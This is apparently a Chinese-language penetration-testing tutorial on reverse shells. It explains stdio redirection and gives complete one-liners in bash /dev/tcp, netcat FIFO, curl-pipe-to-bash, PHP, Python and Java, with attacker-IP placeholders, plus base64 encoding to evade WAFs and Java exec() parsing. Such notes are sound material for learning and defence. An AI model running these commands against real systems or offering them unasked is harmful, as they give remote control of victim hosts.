
# 反弹shell

## 反弹shell介绍
**反弹 Shell（Reverse Shell）** 是指==受害主机在执行恶意指令后，主动发起网络连接，将本地交互式终端（如 Bash、sh、PowerShell）的标准输入、输出和错误流重定向到攻击者预先搭建的监听服务器上==。
反弹shell一般指的是一种渗透测试过程中的权限维持手段；==做法一般是：攻击机监听在某个TCP/UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机==


![](a90f2ce5c5d749855411253d5707087f_720.jpg)

## 反弹shell应用场景

**核心优势与应用场景**

- **穿透防火墙与 NAT 限制**：受害服务器通常位于企业内网，防火墙大多严格拦截外部入站（Inbound）流量，但对外站连接（Outbound）策略较为宽松。
- **解决 IP 不可达问题**：目标机器若为内网私有 IP 或动态 IP，攻击者无法直接正向连接（Bind Shell），由受害者主动连接攻击者的公网 IP 则不受影响。
- **提供完整交互环境**：解决 Web 漏洞回显截断、无回显（Blind RCE）以及无法执行交互式命令（如 `su`、`ssh`、`sudo`）的问题


![](4b7fdd6d6e384719a785dae9d459baef_720.jpg)


## 补：反弹shell前置知识(Linux)
==反弹 Shell 的底层原理，就是利用**重定向符号**将执行环境的**标准输入、标准输出、标准错误文件描述符**与网络 Socket 建立的数据流进行绑定与置换==
![](805d63c01da8a055dc7f70d154109102_720.jpg)


### LinuxOS中的==stdio的文件描述符==与==重定向符号==
文件描述符 (FD)
- 0              ->标准输入，默认从键盘读取输入

- 1              ->标准输出，默认输出结果到终端

- 2              ->标准错误，默认输出结果到终端

**核心重定向符号及作用机制**

重定向操作用于改变进程获取输入或发送输出的目标位置：
- **输出重定向**
    - `>`：覆盖写入目标文件（默认省略 `1>`，即重定向 stdout）。
    - `>>`：追加写入目标文件。
    - `2>`：仅将标准错误（stderr）重定向到目标。


- **输入重定向**
    - `<`：从指定文件或数据流中读取内容替代键盘输入（等同于 `0<`）。


- **文件描述符之间的重定向（FD 复制与合并）**
    - `&` 后接数字：在重定向语法中表示**文件描述符**，用于区分普通文件名。例如 `>1` 代表写入名为 `1` 的文件，而 `>&1` 代表重定向到标准输出。
    - `2>&1`：将标准错误（FD 2）合并重定向到当前标准输出（FD 1）所在的位置。
    - `&>` 或 `>&`：Bash 的快捷写法，同时将标准输出和标准错误（FD 1 和 FD 2）重定向到目标。
    - `0>&1`（或 `0<&1`）：将标准输入（FD 0）重定向到标准输出（FD 1）所指向的数据流通道。

![](40f433977d2b283b360d604a9e476f5d_720.jpg)

     (在shell终端显示输出)      (将结果输出进file文件里，不包含错误)  (将结果全部输出写入file文件里，无论错误与否)



## bash/sh环境下反弹shell介绍

### 使用bash/sh原生命令

- 目标机命令：
```
sh/bash -c "bash -i >& /dev/tcp/<攻击机IP>/<PORT> 0>&1"
```

命令解析
- `bash-c`，后面跟执行的shell命令
- `bash-i`，创建一个交互式的bash进程
- `/dev/tcp/ip/port`，攻击机的ip和监听端口
![](39aa2f4e519a4e12dcf8e75f7e066497_720.jpg)


## 使用netcat工具进行反弹shell

#### 补：netcat工具介绍
Netcat（简称 `nc`）==是一个功能强大的命令行网络工具。==它支持 TCP 和 UDP 协议，通过简单的命令就能在两台电脑之间读写数据，常用于网络测试、传输文件和安全检查

主要功能

- **端口监听与连接**：可以开启端口等待连接，或者主动连接到指定 IP 和端口。
- **文件传输**：在两台主机之间发送和接收文件或目录。
- **端口扫描**：检查目标主机开放了哪些端口，测试网络服务是否正常。
- **远程 Shell**：绑定系统 Shell，实现简单的远程控制

常用命令

- **监听端口**：`nc -l <8080>`（让本机在 8080 端口进行监听）
- **连接目标**：`nc <192.168.1.100> <8080>`（连接到指定主机的 8080 端口）
- **传输文件**：`nc -l <8080> > <received_file.txt>`（接收端）与 `nc <192.168.1.100> <8080> < <my_file.txt>`（发送端）
- **扫描端口**：`nc -z -v <192.168.1.100> <1-1000>`（扫描 1 到 1000 范围的端口）


#### netcat工具进行反弹shell

- 目标机命令：
**FIFO（命名管道）闭环转发**
```
rm /tmp/kx;mkfifo /tmp/kx;cat /tmp/kx | /bin/sh -i 2>&1 | nc <攻击机IP> <port> > /tmp/kx
```


命令解析
- `mkfifo`，创建一个先进先出的管道对接到文件/tmp/kx中
- `cat /tmp/kx | /bin/sh-i`,使用sh执行管道文件/tmp/kx中的内容

**原理拆解**：

1. `mkfifo /tmp/kx`：在临时目录创建一个先进先出（FIFO）命名管道文件。
2. `cat /tmp/kx | /bin/sh -i 2>&1`：`cat` 持续读取管道中的内容并作为标准输入送入交互式 Shell 执行，Shell 的标准输出和错误合并输出。
3. `| nc <ATTACKER_IP> 4444`：将 Shell 的输出结果通过管道注入 `nc` 发送到攻击端。
4. `> /tmp/kx`：`nc` 接收到的攻击者键盘输入被重定向写回命名管道 `/tmp/kx`，完成闭环

## 补：Base64 编码规避反弹shell
Payload 中包含 `&`、`>`、`<`、空格等符号时，常被 Web 框架或 WAF 拦截或截断，可以尝试将命令编码后再进行解码执行反弹shell操作

- 目标机命令：
```
echo "bash -i >& /dev/tcp/<攻击机IP>/<port> 0>&1" | base64
```

```
echo <反弹shell命令的bashe64编码> | base64 -d | bash
```







## 使用curl配合管道命令进行类似shell反弹

#### curl工具介绍
`curl` ==是一个开源的命令行网络工具，全称为 Client URL==。它用来通过 URL 格式传输数据，支持 HTTP、HTTPS、FTP、SFTP 等上百种网络协议。开发者经常用它来请求 Web 服务器、测试 API 接口以及下载或上传文件

主要功能

- **发送网络请求**：支持 GET、POST、PUT、DELETE 等各种 HTTP 方法。
- **API 调试与测试**：可自定义请求头、Cookie、表单数据和发送 JSON 数据。
- **文件传输**：支持从服务器下载文件或向服务器上传文件。
- **多协议支持**：不仅支持网页浏览常用的 HTTP/HTTPS，还支持 FTP、SMTP 等

常用命令示例

- **基本 GET 请求**：`curl https://example.com`
- **保存下载文件**：`curl -O https://example.com/file.zip`
- **发送 POST 请求与 JSON 数据**：`curl -X POST -H "Content-Type: application/json" -d '{"name":"test"}' https://example.com`
- **查看响应头信息**：`curl -I https://example.com`

#### curl配合管道命令进行类似shell反弹
**`curl` 配合管道命令（Pipe-to-Shell）** 是一种通过网络动态加载并执行 Payload 的技术。==目标机利用 `curl` 从攻击者控制的 Web 服务器下载反弹 Shell 脚本，并通过管道符 `|` 直接送入 `bash` 或 `sh` 内存中执行，实现无文件（Fileless）反弹落地==

- 目标机命令：
```
curl -s http://<攻击机IP>:<port>/<恶意文件> | bash
```




## 其他常见的反弹shell手法和注意事项


### 基于脚本语言解释器的反弹shell
本质上反弹shell是基于websocket协议实现的，因此可以借助一些脚本语言解释器配合其语法特性实现反弹shell操作

当目标系统缺少 `nc`、Bash 被精简或受到受限 Shell（rbash）限制时，利用系统预装的动态脚本语言解释器（如 Python、PHP、Perl、Ruby、Node.js）构造反弹 Shell 是最通用的方案

其底层机制依然遵循统一的操作系统模型：**通过解释器网络库创建 TCP Socket $\rightarrow$ 利用 `dup2` 等系统调用将 Socket FD 复制给标准输入/输出/错误 $\rightarrow$ 派生交互式进程**

#### 基于PHP的反弹shell

- 目标机命令：
```
php -r '<$sock>=fsockopen("<攻击机IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

`fsockopen` 打开网络连接后，分配的第一个可用文件描述符通常为 `3`，随后通过重定向 `<&3 >&3 2>&3` 将输入输出直接绑死在该 Socket 上


#### 基于Python的反弹shell
==原生支持 `pty` **模块来分配伪终端**==

- 目标机命令：
```
python3 -c 'import socket,os,pty;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("<攻击机IP>",<PORT>));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

- `s.fileno()`：获取当前创建的网络 Socket 的底层文件描述符编号。
- `os.dup2(s.fileno(), 0/1/2)`：将 Socket FD 依次复制并覆盖进程的 `stdin(0)`、`stdout(1)`、`stderr(2)`。
- `pty.spawn("/bin/bash")`：分配一个 PTY（伪终端），相比普通管道反弹，能够获得完全交互式的 TTY 环境（支持 `Ctrl+C` 信号捕获、`sudo` 交互提示、Tab 补全等）



#### 基于JAVA的反弹shell与其坑点
在 Java 企业级应用（如 Spring Boot、Tomcat、WebLogic 等）的漏洞利用场景（反序列化、Log4j/JNDI 注入、SSTI、OGNL 表达式注入等）中，反弹 Shell 主要分为**系统命令调用**与**纯 Java 内存数据流转发**两种路径

##### 补：java常用命令执行函数
Java 主要通过 `java.lang.Runtime` 和 `java.lang.ProcessBuilder` 两个核心类来执行操作系统本地命令。它们==可以启动新进程、传递参数并获取执行结果==

1. `Runtime.exec()`
- 语法：
```
Runtime.getRuntime().exec(<系统命令>)
```
支持传入整条命令字符串，或将命令与参数分开的字符串数组

2. ProcessBuilder.start()
- 语法：
```
Process <p> = new ProcessBuilder("<系统命令>", "<hostIP>").start();
```

- `ProcessBuilder(List<String> command)`：用指定的命令和参数字符串列表创建。
- `ProcessBuilder(String... command)`：用可变长字符串数组创建命令。
- `start()`：启动一个新进程并返回 `Process` 实例

3. ProcessImpl.start()
用于创建和启动底层操作系统进程的核心执行函数，是 Java 底层用于创建和执行系统进程的核心静态方法
- 语法：
```
ProcessImpl.start(

String[] cmdarray, 
Map<String, String> environment, 
String dir, ProcessBuilder.Redirect[] redirects, 
boolean redirectErrorStream
)
```


![](208c3c28625e61c8aea02903751275fd_720.jpg)


##### ==补：JAVA的反弹shell中的问题==
==**`Runtime.getRuntime().exec()` 的重定向失效**==

```
// 错误示范：无法反弹成功
Runtime.getRuntime().exec("bash -i >& /dev/tcp/<攻击机IP>/<port> 0>&1");
```
反弹shell失败问题

**失效原因**：`exec(String)` 底层通过 `StringTokenizer` 按空格分割参数，并直接作为系统参数传递，**不会默认调用系统 Shell**。因此重定向符号 `>`、`&` 和伪路径 `/dev/tcp/...` 会被当作普通字符参数，无法被操作系统解析


![](6bf0446cff7c89dad62595df6c7a89bd_720.jpg)


![](73877da401ec7b05f752113ebe78e397_720.jpg)


##### JAVA的反弹shell——管道符+base64编码绕过反弹(Base64 编码规避解析异常)

- 目标机命令：
```
// echo 'bash -i >& /dev/tcp/<攻击机IP>/<port> 0>&1' | base64
String payload = "bash -c {echo,<反弹shell命令的bashe64编码>}|{base64,-d}|{bash,-i}"; Runtime.getRuntime().exec(payload);
```






























































































































































































































































































































































































